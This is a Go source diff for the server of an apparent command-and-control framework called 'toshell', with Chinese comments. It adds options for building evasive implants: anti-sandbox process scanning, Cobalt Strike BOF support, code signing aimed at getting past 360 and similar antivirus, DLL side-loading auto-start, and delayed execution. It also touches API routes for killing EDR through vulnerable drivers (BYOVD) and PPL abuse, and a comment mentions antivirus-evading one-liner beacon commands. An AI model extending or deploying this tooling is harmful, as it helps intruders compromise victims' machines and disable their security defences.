@@ -17,6 +17,7 @@ import (
 	"toshell/internal/server/auth"
 	"toshell/internal/server/builder"
 	"toshell/internal/server/config"
+	"toshell/internal/server/drivers"
 	"toshell/internal/server/logging"
 	"toshell/internal/server/session"
 	"toshell/internal/server/task"
@@ -58,6 +59,24 @@ type BuildRequest struct {
 	XORKeySize   int  `json:"xor_key_size"`
 	GarbleEnable bool `json:"garble_enabled"`
 	UPXEnable    bool `json:"upx_enabled"`
+	// EvasionScan 主动反沙箱进程检测（默认关闭）：枚举进程并与安全软件/分析工具
+	// 进程名比对后延迟执行。该行为会被国产杀软主动防御拦（见植入端
+	// gate_scan_windows.go），且需要静态 API 导入与进程名字符串，故默认不编译。
+	EvasionScan bool `json:"evasion_scan"`
+	// BofEnabled BOF（Cobalt Strike Beacon Object File）支持：默认关闭。
+	// 开启会让载荷带上整套 Beacon* API 名字（22 处 pclntab 明文），只在需要跑 BOF 时开。
+	BofEnabled bool `json:"bof_enabled"`
+	// SignEnabled 构建后代码签名：证书在服务端配置（builder.sign_*），请求只能开启。
+	// 未签名的新 PE 在装有 360/电脑管家的主机上会被拒绝执行，签名是"能不能跑起来"的敲门砖。
+	SignEnabled bool `json:"sign_enabled"`
+	// DLLExport / DLLAutoStart 仅 format=dll 生效：导出函数名（rundll32 payload.dll,<名字>，
+	// 留空=Start）与"加载即启动"（白加黑场景宿主不一定调用我们的导出函数，默认 true）。
+	DLLExport    string `json:"dll_export"`
+	DLLAutoStart *bool  `json:"dll_autostart"`
+	// 启动随机延迟（秒）：留空(0)时用服务端配置 implant.startup_delay_min/max，
+	// 再回退 2~10s。显式传值可覆盖（如 20/60 拉长"启动即行为"的时间窗）。
+	StartupDelayMin int `json:"startup_delay_min"`
+	StartupDelayMax int `json:"startup_delay_max"`
 }
 
 type BuildResponse struct {
@@ -79,6 +98,17 @@ type BuildResponse struct {
 	// OneLiners 多条免杀上线命令变体（PowerShell/BITS/LOLBin/curl/python...），
 	// 便于现场按终端拦截情况换用；OneLiner 为其首选项的兼容字段。
 	OneLiners []OneLiner `json:"one_liners,omitempty"`
+	// ── 代码签名结果（未启用签名时为零值）──
+	// Signed 产物是否带有效 Authenticode 签名；Signer 签名者主题；SignStatus 复核状态
+	// （Valid/NotSigned/UnknownError…）；SignMessage 中文说明（失败/跳过原因）。
+	Signed      bool   `json:"signed"`
+	Signer      string `json:"signer,omitempty"`
+	SignMethod  string `json:"sign_method,omitempty"`
+	SignStatus  string `json:"sign_status,omitempty"`
+	SignMessage string `json:"sign_message,omitempty"`
+	// ── 落地链建议（按平台/格式 + 是否已签名给出"该走哪条链"）──
+	LoaderAdviceTitle string   `json:"loader_advice_title,omitempty"`
+	LoaderAdviceTips  []string `json:"loader_advice_tips,omitempty"`
 }
 
 type ImplantsInfo struct {
@@ -125,6 +155,10 @@ type Server struct {
 	// 屏幕流帧限速/合并状态（见 screen_frame_limiter.go，P0.2）
 	screenLimiter     *screenFrameLimiter
 	screenLimiterOnce sync.Once
+
+	// 本会话已加载的 BYOVD 驱动档案（服务端不再内置驱动，见 handlers_edr.go）
+	driverMu       sync.Mutex
+	sessionDrivers map[string]drivers.Driver
 }
 
 // SetOnConfigApplied 注册配置热应用回调（设置 API 保存后触发）。
@@ -457,6 +491,8 @@ func (s *Server) setupRoutes() {
 	api.HandleFunc("/sessions/{id}/edr/byovd-kill", s.byovdKillHandler).Methods("POST")
 	api.HandleFunc("/sessions/{id}/edr/ppl-kill", s.pplKillHandler).Methods("POST")
 	api.HandleFunc("/drivers", s.listDriversHandler).Methods("GET")
+	// 驱动加载前自检（sha256 一致性 / Authenticode 签名者 / 易受攻击驱动黑名单提示）
+	api.HandleFunc("/drivers/{name}/verify", s.verifyDriverHandler).Methods("GET")
 	api.HandleFunc("/drivers/{name}/raw", s.downloadDriverHandler).Methods("GET")
 	api.HandleFunc("/settings", s.getSettingsHandler).Methods("GET")
 	api.HandleFunc("/settings", s.updateSettingsHandler).Methods("PUT")
